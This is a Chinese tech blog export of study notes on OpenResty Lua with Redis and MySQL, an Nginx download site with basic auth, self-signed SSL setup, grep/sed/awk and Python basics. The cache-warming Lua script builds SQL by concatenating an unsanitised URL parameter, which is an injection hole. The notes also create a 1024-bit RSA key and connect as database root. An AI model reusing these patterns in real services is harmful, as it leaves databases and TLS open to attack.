> 该指令是应用最多的指令, 大部分任务均在本阶段完成, 其他阶段主要是为本阶段准备数据

**header_filter_by_lua***

> 用于设置应答消息的头信息

**body_filter_by_lua***

> 用于对响应数据进行过滤、截断、替换操作

**balancer_by_lua***

> 主要用于实现上游服务器的负载均衡算法

#### 日志阶段指令

**log_by_lua***

> 用于在log请求处理阶段, 用Lua代码处理日志, 但并不替换原有log处理

### 操作案例

```
参考文档: 
https://github.com/openresty/lua-nginx-module#nginx-api-for-lua
```

```
需求:
访问路径http://192.168.253.138?name=tim&gender=1
Nginx接收请求后, 根据gender传值, 若等于1,显示tim先生, 若等于0, 显示tim女士, 若即不是0也不是1, 返回tim
```

```nginx
# 配置/usr/local/openresty/nginx/conf/nginx.conf文件路由
		location /getGender{
            charset utf8;
            default_type 'text/html';
            set_by_lua $value "
            	-- 获取请求参数
                local params = ngx.req.get_uri_args()
                local name = params['name']
                local gender = params['gender']
                -- 判断组装返回值
                if gender == '1' then
                    gender_str = '先生'
                elseif gender == '0' then
                    gender_str = '女士'
                else 
                    gender_str = ''
                end
                str_total = name .. gender_str
                -- 返回结果
                return str_total
            ";
            return 200 $value;
        }
```

```shell
# 重启nginx
$ sudo /usr/local/openresty/nginx/sbin/nginx -s reload
```

![image-20220608190959254](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f9433cfde6f42edc5f480245abda37b5-dbaf6a3.png)

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx中的Lua使用10</title>
    <url>/2021/06/21/Nginx/Nginx10%E4%B8%AD%E7%9A%84Lua%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[
# Nging中的Lua使用

## ngx_lua操作redis

```
Nginx 支持三种方法访问Redis
- HttpRedis模块
	指令少, 功能单一, 适合简单缓存
- HttpRedis2Module
	比较灵活, 功能强大
- lua-resty-redis库
	OpenResty提供的操作Redis的接口库, 适合复杂业务逻辑
```

### 查询基本使用API

OpenResty官方文档

```
https://github.com/openresty/lua-resty-redis
```

> 在lua-resty-redis中, 所有Redis命令都有自己的方法, 名称与Redis命令相同, 只是全部小写

### 修改RestyNginx配置文件

```nginx
# sudo vi /usr/local/openresty/nginx/conf/nginx.conf
		location /showRedis{
            default_type 'text/html';
            content_by_lua_block{
                -- 引入Redis接口模块
                local redis = require "resty.redis"
                -- 创建Redis对象
                local redisObj = redis:new()
                -- 设置超时时间
                redisObj:set_timeout(1000)
                local ok,err = redisObj:connect("192.168.253.135",6379)
                if not ok then
                    ngx.say('failed to connection with redis',err)
                    return
                else
                    ngx.say('connect to Redis success','<br>')
                end
                -- 向Redis存入数据
                local ok,err = redisObj:set('username','ni9ne')
                if ok then
                    ngx.say('set value username_ni9ne:', ok,'<br>')
                else
                    ngx.say('failed to set value',err)
                    return
                end
                -- 从Redis中获取数据
                local res,err = redisObj:get('username')
                ngx.say('<h1>',res,'<h1>')
                -- 关闭Redis连接
                redisObj:close()
            }
        }
```

### 验证配置路由结果

![image-20220609012350518](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/93fd3c7bd253c60a886c0e78c31cd214-949d4d8.png)

![image-20220609012412032](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8d5070a50c55ee8993b28ff1e3c535a3-80b026e.png)

## ngx_lua操作MySql

```
在ngx_lua中, MySql有两种访问方式:
- 使用OpenResty自带的ngx_lua模块和lua-resty-mysql模块
- 安装drizzle_nginx_module(HttpDrizzleModule)模块
	文档路径为: https://github.com/openresty/drizzle-nginx-module
```

> 已安装OpenResty, 使用lua-resty-mysql

### 查询基本使用API

OpenResty官方文档

```
https://github.com/openresty/lua-resty-mysql
```

### 单条数据查询

**修改Nginx配置文件**

```nginx
# sudo vi /usr/local/openresty/nginx/conf/nginx.conf
		location /mysqlQuery{
            default_type 'text/html';
            content_by_lua_block{
        		-- 引入resty.msyql模块
                local mysql = require 'resty.mysql'
            	-- 创建连接对象
                local db = mysql:new()
            	-- 建立连接
                local ok,err = db:connect{
                    host="192.168.253.134",
                    port=3306,
                    user="root",
                    password="xxxxxx",
                    database="nginx_db"
                }
        		-- 验证是否连接成功
                if not ok then
                    ngx.say('failed connected to mysql',err)
                    return
                else
                    ngx.say('mysql connected success'..'<br/>')
                end
            	-- 设置超时时间
                db:set_timeout(1000)
            	-- 发送SQL语句
                db:send_query('select * from users where id=2')
            	-- 接收返回结果
                local res,err,errcode,sqlstate = db:read_result()
            	-- 输出信息到页面
                if not err then
                    ngx.say('res[1].username:',res[1].username)
                    ngx.say('<br/>')
                end
                ngx.say('err:',err)
                ngx.say('<br/>')
                ngx.say('errcode:',errcode)
                ngx.say('<br/>')
                ngx.say('sqlstate:',sqlstate)
            	-- 关闭连接
                db:close()
            }
        }
```

**验证配置路由结果**

![image-20220609020926699](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/86388f1fca6fde11dade06df7e1aa189-1b65852.png)

SQL错误信息如下所示:

![image-20220609021614599](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1093039c88fc483b63732db7be246f53-c5e9cf6.png)

### 多条数据查询

**修改Nginx配置文件**

```nginx
# sudo vi /usr/local/openresty/nginx/conf/nginx.conf
        location /mysqlQuery{
            default_type 'text/html';
            content_by_lua_block{
                local mysql = require 'resty.mysql'
                local db = mysql:new()
                local ok,err = db:connect{
                    host="192.168.253.134",
                    port=3306,
                    user="root",
                    password="xxxxxx",
                    database="nginx_db"
                }
                if not ok then
                    ngx.say('failed connected to mysql',err)
                    return
                else
                    ngx.say('mysql connected success'..'<br/>')
                end
                db:set_timeout(1000)
                db:send_query('select * from users')
                local res,err,errcode,sqlstate = db:read_result()
                if not err then
                    --[[
                    ngx.say('res[1].username:',res[1].username)
                    ngx.say('<br/>')
                    --]]
            		# for循环解析多条数据
                    for i,v in pairs(res) do
                        ngx.say('username:'..v.username,'|','salary:'..v.salary)
                        ngx.say('<br/>')
                    end
                end
                ngx.say('err:',err)
                ngx.say('<br/>')
                ngx.say('errcode:',errcode)
                ngx.say('<br/>')
                ngx.say('sqlstate:',sqlstate)
                db:close()
            }
        }
```

**验证配置路由结果**

![image-20220609023333612](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d3fc6fc2d3c8bce7f4ad08c4106ab70a-d76d129.png)

### 使用CJson编码数据table

**修改Nginx配置文件**

```nginx
# sudo vi /usr/local/openresty/nginx/conf/nginx.conf
        location /mysqlQuery{
            default_type 'text/html';
            content_by_lua_block{
                local mysql = require 'resty.mysql'
            	# 引入cjson模块, 也可以在http块中初始化
            	# init_by_lua_block{ cjson=require 'cjson' }
                local cjson = require 'cjson'
                local db = mysql:new()
                local ok,err = db:connect{
                    host="192.168.253.134",
                    port=3306,
                    user="root",
                    password="xxxxxx",
                    database="nginx_db"
                }
                if not ok then
                    ngx.say('failed connected to mysql',err)
                    return
                else
                    ngx.say('mysql connected success'..'<br/>')
                end
                db:set_timeout(1000)
                db:send_query('select * from users')
                local res,err,errcode,sqlstate = db:read_result()
                if not err then
                    --[[
                    for i,v in pairs(res) do
                        ngx.say('username:'..v.username,'|','salary:'..v.salary)
                        ngx.say('<br/>')
                    end
                    --]]
                    local res_json = cjson.encode(res)
                    ngx.say('res_json: ',res_json)
                    ngx.say('<br/>')
                end
                ngx.say('err:',err)
                ngx.say('<br/>')
                ngx.say('errcode:',errcode)
                ngx.say('<br/>')
                ngx.say('sqlstate:',sqlstate)
                db:close()
            }
        }
```

**验证配置路由结果**

![image-20220609023722667](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e6d8125c772e8eaf0cdfbb5b757f6c41-efbd963.png)

### 使用query()执行查询/读取

使用`query()`可以替代`send_query()`+`read_result()` 

**修改Nginx配置文件**

```nginx
# sudo vi /usr/local/openresty/nginx/conf/nginx.conf
        location /mysqlQuery{
            default_type 'text/html';
            content_by_lua_block{
                local mysql = require 'resty.mysql'
                local cjson = require 'cjson'
                local db = mysql:new()
                local ok,err = db:connect{
                    host="192.168.253.134",
                    port=3306,
                    user="root",
                    password="xxxxxx",
                    database="nginx_db"
                }
                if not ok then
                    ngx.say('failed connected to mysql',err)
                    return
                else
                    ngx.say('mysql connected success'..'<br/>')
                end
                db:set_timeout(1000)
                local sql = 'select * from users'
            	# 使用query()
                local res,err,errcode,sqlstate = db:query(sql)
                if res then
                    local res_json = cjson.encode(res)
                    ngx.say('res_json: ',res_json)
                    ngx.say('<br/>')
                end
                ngx.say('err:',err)
                ngx.say('<br/>')
                ngx.say('errcode:',errcode)
                ngx.say('<br/>')
                ngx.say('sqlstate:',sqlstate)
                db:close()
            }
        }
```

### 增删改操作

> 增删改操作只需要将对于SQL放入query()中即可, 仅返回数据不同

**修改Nginx配置文件**

```nginx
# sudo vi /usr/local/openresty/nginx/conf/nginx.conf
        location /mysqlQuery{
            default_type 'text/html';
            content_by_lua_block{
                local mysql = require 'resty.mysql'
                local cjson = require 'cjson'
                local db = mysql:new()
                local ok,err = db:connect{
                    host="192.168.253.134",
                    port=3306,
                    user="root",
                    password="xxxxxx",
                    database="nginx_db"
                }
                if not ok then
                    ngx.say('failed connected to mysql',err)
                    return
                else
                    ngx.say('mysql connected success'..'<br/>')
                end
                db:set_timeout(1000)
                -- local sql = "insert into users (username,birthday,salary) values ('aris','1998-12-07',22356)"
                -- local sql = "update users set salary=100 where id=1"
                local sql = "delete from users where username = 'aris'"
            	# 使用query()
                local res,err,errcode,sqlstate = db:query(sql)
                if res then
                    local res_json = cjson.encode(res)
                    ngx.say('res_json: ',res_json)
                    ngx.say('<br/>')
                end
                ngx.say('err:',err)
                ngx.say('<br/>')
                ngx.say('errcode:',errcode)
                ngx.say('<br/>')
                ngx.say('sqlstate:',sqlstate)
                db:close()
            }
        }
```

**验证结果**

```mysql
-- 新增
insert into users (username,birthday,salary) values ('aris','1998-12-07',22356)
```

![image-20220609033006008](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/05d3ebca7f8d8871d616fc3fbf809dc5-13b419c.png)



```mysql
-- 修改
update users set salary=100 where id=1
```

![image-20220609033232697](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e84f6c3dfb1904c19d695872bc627cc8-fac20ff.png)



```mysql
-- 删除
delete from users where username = 'aris'
```

![image-20220609033404049](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d98df28605aea32d6ff92beb8230ffd5-381e133.png)

## ngx_lua缓存预热

### 需求

使用ngx_lua做缓存预热. 访问路径`http://192.168.253.138/cacheWarm?username=Tom`, 不带参数时, 将所有数据缓存进Redis, 带参数时, 仅更新一条

### 修改配置

```shell
$ sudo mkdie /usr/local/openresty/nginx/lua_script
$ sudo vim /usr/local/openresty/nginx/lua_script/lua_init_script.lua
$ sudo vim /usr/local/openresty/nginx/lua_script/lua_cache_warm_script.lua 
$ sudo vim /usr/local/openresty/nginx/conf/nginx.conf
```

```nginx
# 修改Nginx配置文件
# sudo vim /usr/local/openresty/nginx/conf/nginx.conf
http {
	...
    init_by_lua_file /usr/local/openresty/nginx/lua_script/init_script.lua;
	...
   	server {
		...
        location /cacheWarm{
            default_type 'text/html';
            content_by_lua_file /usr/local/openresty/nginx/lua_script/lua_cache_warm_script.lua;
        }
    }
}
```

```lua
-- 创建初始化脚本
-- sudo vim /usr/local/openresty/nginx/lua_script/lua_init_script.lua
redis = require 'resty.redis'
mysql = require 'resty.mysql'
cjson = require 'cjson'
```

```lua
-- 创建业务逻辑脚本
-- sudo vim /usr/local/openresty/nginx/lua_script/lua_cache_warm_script.lua 
-- 获取get参数username
local param = ngx.req.get_uri_args()['username'];

-- 连接数据库
local db = mysql:new()
local ok,err = db:connect{
	host="192.168.253.134",
	port=3306,
	user="root",
	password="xxxxxx",
	database="nginx_db"
}
if not ok then
	ngx.say("failed connect to mysql: ",err)
	return
end
db:set_timeout(1000)

-- 依据get参数构建SQL
local sql = ""
if param then
	sql = "select * from users where username = ".."'"..param.."'"
else
	sql = "select * from users"
end

--执行SQL,获取数据
local res,err,errcode,sqlstate = db:query(sql)
if not res then
	ngx.say("failed query in mysql: ",err)
	return
end

-- 连接Redis
local redisObj = redis:new()
local ok,err = redisObj:connect("192.168.253.135",6379)
if not ok then
	ngx.say("failed connect to redis: ",err)
	return
end
redisObj:set_timeout(1000)

-- 循环MySQL数据存入Redis
local count=0
for i,v in ipairs(res) do
	local redis_key = "user_"..v.username
	local res_json = cjson.encode(v)
	local ok,err = redisObj:set(redis_key,res_json)
	if not ok then
		ngx.say("failed set redis value: "..redis_key..'-'..res_json,err)
	else
		ngx.say("success set redis value: "..redis_key..'-'..res_json)
	end
	ngx.say("<br/>")
	count = count + 1
end
ngx.say("warm cache success, total count "..count)

-- 关闭连接
db:close()
redisObj:close()
```

### 访问结果

```
访问 http://192.168.253.138/cacheWarm
```

![image-20220609041921037](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c4fad63b98a525646e58ba1fbf915d3f-3d85e66.png)



```
访问http://192.168.253.138/cacheWarm?username=Tom
```

![image-20220609041936691](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3c10337f6602ad6bd077ddf415df731f-7714d96.png)



**查看Redis缓存结果**

![image-20220609043004337](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f997b146e9e9c74db24c13cbdc8d73b7-97ffa41.png)]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Ngnix制作下载站11</title>
    <url>/2021/06/21/Nginx/Nginx11%E5%88%B6%E4%BD%9C%E4%B8%8B%E8%BD%BD%E7%AB%99+%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[
## Ngnix制作下载站

类似于如下效果:

访问:  `https://nginx.org/download/`

![image-20220607155607509](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/99329265b5f622d51dba950071731e3f-d73496c.png)

nginx使用模块ngx_http_autoindex_module实现, 该模块处理以斜杆`/`结尾的请求, 并生成目录列表

该模块自动加载, 但默认关闭, 需要使用指令开启配置

### 指令解析

#### autoindex指令

启用或禁用目录列表输出

```
语法: 
	autoindex on|off
默认值:
	off
位置:
	http server location块
```

#### autoindex_format指令

设置目录列表的格式

```
语法:
	autoindex_format html|xml|json|jsonp
默认值:
	html
位置:
	http serve location
```

#### autoindex_exact_size指令

对应`autoindex_format`的HTML格式. 指定是否在目录列表中展示文件详细大小. 默认on, 显示文件确切大小, 单位为bytes. off时, 显示大概大小, 单位KB/MB/GB

```
语法:
	autoindex_exact_size on|off
默认值:
	autoindex_exact_size on
位置:
	http server location块
```

#### autoindex_localtime指令

对应`autoindex_format`的HTML格式. 是否在目录列表上显示时间. 默认为off, 显示的文件时间为UTC时间. on时, 显示文件的本地时区时间

```
语法:
	autoindex_localtime on|off
默认值:
	autoindex_localtime off
位置:
	http server location块
```

### 配置nginx.conf文件

```
http{
	...
	server{
		...
		# 下载站点配置
        location /download{
            root /var/www/nginx-module;
            autoindex on;
            autoindex_exact_size on;
            autoindex_format html;
            autoindex_localtime on;
        }
	}
}
```

### 效果展示

![image-20220607170033885](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7e74d4af69436a7b8f4ecbf9bb7f9ad-519da34.png)

## 资源下载用户认证

Nginx通过ngx_http_auth_basic_module模块实现用户认证, 允许通过使用HTTP基本身份验证协议验证用户名和密码来限制对资源的访问, Nginx默认安装了该模块

### 模块指令

#### auth_basic指令

使用HTTP基本认证协议开启/关闭用户名密码验证

```
语法:
	auth_basic string|off
默认值:
	autoindex_exact_size off
位置:
	http server location limit_except块
```

> 开启后, 指定字符串会以头信息字段的方式返回到客户端, 给用户提示信息, 但不同浏览器展示方式不同

#### auth_basic_user_file指令

指定用户名密码验证文件(一般使用`htpasswd`生成)

```
语法:
	auth_basic_user_file file
位置:
	http server location limit_except块
```

> 指定文件路径, 该文件中包含用户名和密码, 密码需要加密, 可以采用`htpasswd`自动生成

### 认证功能实现

#### 修改nginx.conf文件

```nginx
http{
	...
	server{
		...
		# 下载站点配置
        location /download{
            root /var/www/nginx-module;
            autoindex on;
            autoindex_exact_size on;
            autoindex_format html;
            autoindex_localtime on;
            auth_basic 'please varify yourself';
            auth_basic_user_file /etc/nginx/htpasswd;
        }
	}
}
```

#### 安装htpasswd工具

```shell
sudo apt install httpd-tools
```

#### htpasswd指令

```shell
$ htpasswd -c /etc/nginx/htpasswd user_name	# 创建一个新密码文件
```

![image-20220607175919503](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4ad350624ec1d63f27a3661e06b12e6a-4736182.png)

```shell
$ htpasswd -b /etc/nginx/htpasswd user_name password # 添加新用户
```

![image-20220607180155361](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c9d2bb8066e4b37ff708f1484852b664-672b81f.png)

```shell
$ htpasswd -D /etc/nginx/htpasswd ni8ne # 删除用户
```

![image-20220607180246736](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6182c4038933360b353e511e44cfba91-d839289.png)

```shell
$ htpasswd -v /etc/nginx/htpasswd ni9ne	# 验证用户密码
```

![image-20220607180413193](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/79b398d4d9dd3aaa160244132c39ffe7-4bc70bb.png)

#### 访问资源下载站点

```
http://192.168.253.134/download/
```

![image-20220607180755952](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d3fe43017634e0ba52748645fc96c55b-b92bac2.png)]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx中添加模块</title>
    <url>/2021/06/22/Nginx/Nginx%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9D%97upstream-fail/</url>
    <content><![CDATA[
## Nginx添加模块upstream-fail

```shell
# https://github.com/gnosek/nginx-upstream-fair 下载fair压缩包
$ wget https://nginx.org/download/nginx-1.14.0.tar.gz # 对照本机版本下载nginx包
$ unzip nginx-upstream-fair
$ tar -zxvf nginx-1.14.0.tar.gz

$ cd nginx-1.14.0
$ vi src/http/ngx_http_upstream.h	# 打开文件
	/ngx_http_upstream_srv_conf_s	# 找到关键字
	131     in_port_t                        default_port;	# 131行添加内容
$ sudo apt install build-essential libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev libxslt1-dev libgd-dev libgeoip-dev	# 安装编译依赖
$ pwd ../nginx-upstream-fair	# 记录下module路径
$ nginx -V	# 复制nginx模块配置
$ ./configure [nginx原有配置] --add-module=[fair-module路径]
$ make
$ sudo mv /usr/sbin/nginx /usr/sbin/nginx_old	# 备份
$ sudo cp objs/nginx /usr/sbin/nginx	# 替换nginx
# $ sudo service nginx restart # 重启nginx
$ make upgrade	# 更新nginx
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx证书生成及使用</title>
    <url>/2021/06/22/Nginx/Nginx%E8%AF%81%E4%B9%A6%E7%94%9F%E6%88%90%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[
## 证书来源

### 1.通过阿里云/腾讯云等第三方服务商购买

免费版, 一般限制一年的有效期

### 2.使用OpenSSL生成证书文件

```
mkdri /root/cert
cd /root/cert
openssl genrsa -des3 -out server.key 1024
# 设定密码
openssl req -new -key server.key -out server.csr
# 输入密码, 验证信息
cp server.key server.key.org
openssl rsa -in server.key.org -out server.key
# 验证密码
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
```

生成文件: server.key | server.crt

## 开启SSL实例

详细官方文档: `https://nginx.org/en/docs/http/ngx_http_ssl_module.html` 

```nginx
server{
    # ssl on;
    listen 443 ssl;
    server_name localhost;
    
    ssl_certificate server.crt;	# 指定证书文件路径
    ssl_certificate_key server.key;	# 指定证书key文件路径
    
    ssl_session_cache shared:SSL:1m;	# 配置用于SSL会话缓存
    # off-禁用, 客户端不得重复使用会话
    # none-禁用, 客户端可以重复使用, 但并没有在缓存中存储会话参数
    # builtin-内置OpenSSL缓存,仅在一个工作进程中使用
    # shared-所有工作进程间共享缓存, 相关信息由name和size指定
    ssl_session_timeout 5m;	# 开启会话后,客户端能够反复使用存储会话时间
    
    ssl_ciphers HIGH:!aNULL:!MD5;	# 允许密码格式,可以用openssl ciphers查看支持格式
    ssl_prefer_server_ciphers on;	# 指定是否服务器密码优先于客户端密码
    
    location /{
        root html;
        index index.html index.htm;
    }
}
```

## 自动转换为https协议

```
location /{
	...
	rewrite ^(.*) https://[server_name]$1;
}

或

server {
    if ($host = [server_name]) {
        return 301 https://$host$request_uri;
    }
}
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX操作(grep_seed_awk)</title>
    <url>/2022/01/12/Linux/LINUX%E6%93%8D%E4%BD%9C(grep_seed_awk)/</url>
    <content><![CDATA[
### bash命令常用功能

#### 字符处理

```shell
# 批量前缀指定
ni9ne@ni9nes:~$ echo naxx{111,123,1112}
naxx111 naxx123 naxx1112
# 连续补全后缀
ni9ne@ni9nes:~$ echo naxx{1..10}
naxx1 naxx2 naxx3 naxx4 naxx5 naxx6 naxx7 naxx8 naxx9 naxx10
# 指定步长补全后缀
ni9ne@ni9nes:~$ echo naxx{1..10..2}
naxx1 naxx3 naxx5 naxx7 naxx9
# 指定格式补全后缀
ni9ne@ni9nes:~$ echo naxx{001..10..2}
naxx001 naxx003 naxx005 naxx007 naxx009

```

#### 命令行快捷键

```
Ctrl + a  移动光标到命令首字符
Ctrl + e 移动光标到命令末尾字符
Ctrl + u 删除光标之前的字符
Ctrl + k 删除光标之后的字符
Ctrl + l 清屏,相当于命令clear
```

### 正则表达式

regular expression - REGEXP

```
基本正则表达式 BRE  Basic Regular Expression
 - 包括字符: 
 	^ - 匹配以指定字符开头, 如 "^nax" 表示匹配以'nax'开头的行
 	$ - 匹配以指定字符结尾, 如 "axx$" 表示匹配以'axx'结尾的行
 	. - 匹配任意一个字符
 	[] - 匹配中括号内任意一个字符, 如 "[abc]" 表示匹配a或b或c
 	* - 匹配前一个字符出现任意次,0次或多次
 	[^abc] - 匹配除了^后出现的任意字符, ^在中括号内代表取反
扩展正则表达式 ERE  Extended Regular Expression
扩展正则需要用grep -E 搭配才能使用
 - 包括字符:
 	() - 分组过滤,将括号内的字符当做一个整体,如"g(oo|la)d"代表good或glad
 		后可以使用\n 引用第n个括号内内容
    {} - 匹配前一个字符指定次数
    	{n,m} - 最少n次,最大m次
    	{n,}  - 最少n次
    	{,m}  - 最多m次
    	{n}   - 正好n次
    ? - 匹配前一个字符0次或一次
    + - 匹配前一个字符一次或多次
    | 或者,同时过滤多个字符串
```

> 主要用于处理大量字符串, 过滤替换处理

### linux工具

grep - 文本过滤工具

sed - 流编辑器

awk - 格式化文本报告生成器

#### grep

global search regular expression and print out the line

文本搜索工具, 根据用户指定的模式逐行匹配目标文本, 打印匹配的行

```
grep [OPTION]... PATTERN [FILE]...
Search for PATTERN in each FILE.
Example: grep -i 'hello world' menu.h main.c
 -i --ignore-case 忽略字符大小写
 -o --only-matching 仅显示匹配到的字符串本身而不是整行
 -v --invert-match 显示未被匹配到的行
 -E --extended-regexp 支持扩展正则
 -q --quiet 不输出任何匹配信息
 -n 显示行号
 -c 仅统计匹配行数
```

```shell
# 排除所有空行
grep '^$' passwd.txt -v
# 排除所有空行和注释行
grep '^$' passwd.txt -v | grep '^#' passwd.txt -v
```

#### sed

Stream Editor 字符流编辑器

用于操作、过滤、转换文本内容的工具, 常用于过滤指定字符串, 取出指定行数据等

![image-20220421235311504](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4f202efa4f14dbf2a5503531cbd2769a-f219d25.png)

```
sed [OPTION]... {script-only-if-no-other-script} [input-file]...
	 选项				内置命令字符					 输入文件
选项参数:
	-n 取消默认输出(默认输出全部,包括未匹配与匹配到的行), 一般与命令字符p一起用
	-i 将修改结果写入文件,不用-i是修改sed内存数据
	-e 多次编辑,免用管道符
	-r 支持扩展正则模式
内置命令字符参数:
	a  append,追加文本,在指定行后添加文本内容
	i  insert,插入文本,在指定行之前插入文本内容
	d  delete,删除匹配文本行
	p  print,打印匹配行内容,通常与选项-n一起使用
	s/匹配正则/替换内容/g  匹配内容并替换(支持正则),g代表全局替换
匹配范围参数:
	空地址    全文处理
	单地址    指定文件某一行
	/pattern/ 匹配到的每一行
	范围区间   10,20 - 10到20行全部 | 10,+5 - 从第十行起向下5步 | /pattern1/,/pattern2/
	步长		1~2 - 从一开始,两步一跳,即1,3,5,7...  | 2~2 - 从二开始,两步一跳,即2,4,6,...
```

##### 案例

```shell
# 输出测试文件第2,3行内容
sed -n '2,4p' passwd.txt # 取消默认输出,仅打印2到4行
# 过滤出含有ni9ne字符串的行
sed -n '/ni9ne/p' passwd.txt 
# 删除含有root的行
sed '/root/d' passwd.txt	# 仅显示删除后文本的剩余内容
sed -i '/root/d' passwd.txt	# 加-i参数后直接修改文件,无回显
# 替换文件中的ni9ne为user09
sed -i 's/ni9ne/user09/g' passwd.txt # 无回显
# 替换文件中的ni9ne为user09,同时替换root为naxx
sed -i -e 's/ni9ne/user09/g' -e 's/root/naxx/g'passwd.txt
# 在文件第二行追加字符 game:x:1000:33:game:/home/game:/bin/bash
sed -i '2a game:x:1000:33:game:/home/game:/bin/bash' passwd.txt
# 在文件首行插入多行字符 
sed -i '1i root1 \n root2' passwd.txt # 多行数据用\n隔开即可
# 在每行文本下添加分隔符 ----
sed -i 'a -----------' passwd.txt # 空地址代表全文处理
# 为前五行数据添加分隔符---
sed -i '1,5a ------' passwd.txt
```

使用sed取出linux的IP地址

```shell
ifconfig ens33 | sed -n '2p' | sed 's/^.*inet //' | sed 's/ netmask.*$//'
或者
ifconfig ens33 | sed -n -e '2s/^.*inet //' -e '2s/ netmask.*$//p'
```

#### awk

拥有强大的文本格式化能力, 可以将文本数据格式化成对应格式输出或显示

```
awk [option] 'pattern[action]' file ...
     选项      模式/动作条件			文件
如: awk '{print $2}' passwd.txt  #表示打印以空格分隔符的第二行数据
 - awk中默认以空格作为分隔符, 且多个空格识别为单个空格
 - awk默认按行处理文件
 - $0代表所有行, $n代表第n列数据, $NF代表最后一列,倒数第二列可以写为$(NF-1)
```

```
awk选项参数
-F 指定字段分隔符
-v 定义或修改awk内部变量
-f 从脚本文件中读取awk命令
```

```
awk内置变量
- $n	指定分隔符分隔的第n列
- $0	所有列,完整的列数据
- FS(field_separator)  字段分隔符, 默认为空格
- NF(number_of_fields)  分隔后的字段总个数
- NR(number_of_records) 记录行总行数
- RS(record_separator) 记录行分隔符, 默认为换行符
- OFS(output_field_separator)  输出字段分隔符, 默认为空格
- ORS(output_record_separator) 输出记录行分隔符, 默认为换行符
- FNR 各文件分别计数行号
- FILENAME 当前处理文件名
- ARGC 命令行参数个数
- ARGV 数组,保存命令行给定参数
awk自定义变量
```

> 自定义输出内容时, 必须外层单引号, 内层双引号, 变量`$1`,`$2` 不可以添加双引号, 否则会识别为文本

##### 案例

```shell
# 输出整行信息
awk '{print}' passwd.txt
awk '{print $0}' passwd.txt
# 输出第1,2列和倒数第二列数据
awk '{print $1,"------",$2,"------",$(NF-1)}' passwd.txt
# 输出文件第五行数据
awk 'NR==5' passwd.txt		# =是给变量赋值, ==表示判断符
# 输出文件第二到第五行数据
awk 'NR==2,NR==5' passwd.txt
# 输出第2行和第五行的内容
awk 'NR==2||NR==5{print $0}' passwd.txt
# 输出第二到第五行的第1,2列数据
awk 'NR==2,NR==5{print $1,$2}' passwd.txt
# 输出所有数据并添加行号
awk '{print NR,$0}' passwd.txt
# 输出以:分隔的passwd文件为以----或制表符为分隔符
awk -F ":" -v OFS="----" '{print $1,$NF}' passwd.txt
awk -v FS=":" -v OFS="\t" '{print $1,$NF}' passwd.txt  
# 处理多个文件显示行号
awk '{print FNR,$0}' passwd.txt spasswd.txt
```

使用awk取出IP地址

```shell
ifconfig ens33 | awk 'NR==2{print $2}'
```

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Python01基础</title>
    <url>/2022/03/21/Python/Python01%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[
# Python基础

## Hello World!

1.命令行操作

![image-20220609183800187](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5082dd655ddb472e293b92850b4228a8-b20438d.png)

2.py文件运行

![image-20220609183903255](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/271f4d499b02119c4ed87c00f519ddb5-e1b326b.png)

3.脚本文件执行

```shell
#! python_path
# 标注解释器位置
```

![image-20220609184141962](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/585cb5ad8b850db751c645cbbe0d75ff-104d7da.png)

## 基本数据类型

### 赋值

![image-20220609184423148](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/50632071999510ca54027fc06b148813-6be47bd.png)

### 常用数据类型

| 变量       | 数据类型         |
| ---------- | ---------------- |
| a=10       | int 整数         |
| a=1.3      | float 浮点数     |
| a=True     | 真值(True/False) |
| a='Hello!' | 字符串           |

## 序列

sequence(序列)是一组**有序**的**元素**的**集合** , 序列可以包含一个或多个**元素**，也可以没有任何元素。

